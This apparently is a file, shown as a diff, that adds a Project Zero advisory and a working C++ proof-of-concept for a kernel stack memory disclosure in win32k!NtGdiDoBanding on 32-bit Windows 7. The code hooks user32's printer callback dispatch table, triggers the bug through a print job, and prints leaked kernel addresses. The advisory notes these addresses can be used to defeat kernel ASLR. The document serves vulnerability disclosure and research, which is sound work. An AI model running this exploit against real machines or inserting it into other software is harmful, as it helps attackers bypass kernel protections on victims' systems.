@@ -1,0 +1,154 @@
+/*
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1304
+
+We have discovered that the win32k!NtGdiDoBanding system call discloses portions of uninitialized kernel stack memory to user-mode clients.
+
+More specifically, exactly 8 bytes of uninitialized kernel stack memory are copied to ring-3 in one of two execution contexts (unique stack traces):
+
+--- 1 ---
+ #0 win32k.sys!memcpy+00000033
+ #1 win32k.sys!UMPDOBJ::ThunkMemBlock+00000047
+ #2 win32k.sys!UMPDDrvStartBanding+000000b1
+ #3 win32k.sys!GreDoBanding+000000ad
+ #4 win32k.sys!NtGdiDoBanding+0000001f
+ #5 ntoskrnl.exe!KiSystemServicePostCall+00000000
+--- 1 ---
+
+... and ...
+
+--- 2 ---
+ #0 win32k.sys!memcpy+00000033
+ #1 win32k.sys!UMPDOBJ::ThunkMemBlock+00000047
+ #2 win32k.sys!UMPDDrvNextBand+000000b1
+ #3 win32k.sys!GreDoBanding+0000011e
+ #4 win32k.sys!NtGdiDoBanding+0000001f
+ #5 ntoskrnl.exe!KiSystemServicePostCall+00000000
+--- 2 ---
+
+The names and offsets are specific to Windows 7 32-bit from February 2017, as symbols for the latest win32k.sys are not available from the Microsoft Symbol Server at the moment. The leaked bytes origin from the stack frame of the win32k!NtGdiDoBanding function (top-level syscall handler), and a pointer to the uninitialized buffer is passed down to win32k!GreDoBanding in the third argument.
+
+The attached proof-of-concept program can be used to reproduce the vulnerability on Windows 7 32-bit. On our test virtual machine, the output is as follows:
+
+--- cut ---
+  [+] Leaked data: 00000bf8 00460000
+  [+] Leaked data: ff9ed130 969e68ad
+  [+] Leaked data: ff9ed130 969e68ad
+  [+] Leaked data: ff9ed130 969e68ad
+...
+--- cut ---
+
+As it turns out, 0xff9ed130 is a valid paged session pool address, and 0x969e68ad is a valid code address within win32k.sys:
+
+--- cut ---
+  3: kd> !pool ff9ed130
+  Pool page ff9ed130 region is Paged session pool
+   ff9ed000 size:  118 previous size:    0  (Allocated)  Usqu
+  *ff9ed118 size:  ee8 previous size:  118  (Allocated) *GDev
+      Pooltag GDev : Gdi pdev
+
+  3: kd> u 969e68ad
+  win32k!EngReleaseSemaphore+0x2f6:
+  969e68ad c3              ret
+  969e68ae 90              nop
+  969e68af 90              nop
+  969e68b0 90              nop
+  969e68b1 90              nop
+  969e68b2 90              nop
+  969e68b3 8bff            mov     edi,edi
+  969e68b5 55              push    ebp
+--- cut ---
+
+Repeatedly triggering the vulnerability could allow local authenticated attackers to defeat certain exploit mitigations (kernel ASLR) or read other secrets stored in the kernel address space.
+*/
+
+#include <Windows.h>
+#include <cstdio>
+
+namespace globals {
+  LPVOID(WINAPI *OrigClientPrinterThunk)(LPVOID);
+}  // namespace globals
+
+PVOID *GetUser32DispatchTable() {
+  __asm {
+    mov eax, fs:30h
+    mov eax, [eax + 0x2c]
+  }
+}
+
+BOOL HookUser32DispatchFunction(UINT Index, PVOID lpNewHandler, PVOID *lpOrigHandler) {
+  PVOID *DispatchTable = GetUser32DispatchTable();
+  DWORD OldProtect;
+
+  if (!VirtualProtect(DispatchTable, 0x1000, PAGE_READWRITE, &OldProtect)) {
+    printf("VirtualProtect#1 failed, %d\n", GetLastError());
+    return FALSE;
+  }
+
+  *lpOrigHandler = DispatchTable[Index];
+  DispatchTable[Index] = lpNewHandler;
+
+  if (!VirtualProtect(DispatchTable, 0x1000, OldProtect, &OldProtect)) {
+    printf("VirtualProtect#2 failed, %d\n", GetLastError());
+    return FALSE;
+  }
+
+  return TRUE;
+}
+
+LPVOID WINAPI ClientPrinterThunkHook(LPVOID Data) {
+  LPDWORD DwordData = (LPDWORD)Data;
+  if (DwordData[0] == 0x1c && (DwordData[1] == 0x39 || DwordData[1] == 0x3a)) {
+    LPDWORD LeakedData = (LPDWORD)DwordData[6];
+    printf("[+] Leaked data: %.8x %.8x\n", LeakedData[0], LeakedData[1]);
+  }
+
+  return globals::OrigClientPrinterThunk(Data);
+}
+
+int main() {
+  // Hook the user32!ClientPrinterThunk callback.
+  if (!HookUser32DispatchFunction(93, ClientPrinterThunkHook, (PVOID *)&globals::OrigClientPrinterThunk)) {
+    printf("Hooking ClientPrinterThunk failed.\n");
+    return 1;
+  }
+
+  // Obtain a print job DC.
+  PRINTDLGA pd = { 0 };
+  pd.lStructSize = sizeof(pd);
+  pd.Flags = PD_RETURNDEFAULT | PD_ALLPAGES | PD_RETURNDC | PD_PRINTTOFILE;
+  pd.nFromPage = 1;
+  pd.nToPage = 1;
+  pd.nCopies = 1;
+
+  if (!PrintDlgA(&pd)) {
+    printf("PrintDlgA failed.\n");
+    return 1;
+  }
+
+  // Initialize the print job.
+  DOCINFOA doc_info = { 0 };
+  doc_info.cbSize = sizeof(doc_info);
+  doc_info.lpszDocName = "Document";
+  doc_info.lpszOutput = "C:\\Windows\\Temp\\output";
+
+  if (StartDocA(pd.hDC, &doc_info) <= 0) {
+    printf("StartDoc failed.\n");
+    return 1;
+  }
+
+  if (StartPage(pd.hDC) <= 0) {
+    printf("StartPage failed.\n");
+    return 1;
+  }
+
+  //
+  // The bug is triggered here.
+  //
+  EndPage(pd.hDC);
+
+  // Free resources.
+  EndDoc(pd.hDC);
+  DeleteDC(pd.hDC);
+
+  return 0;
+}
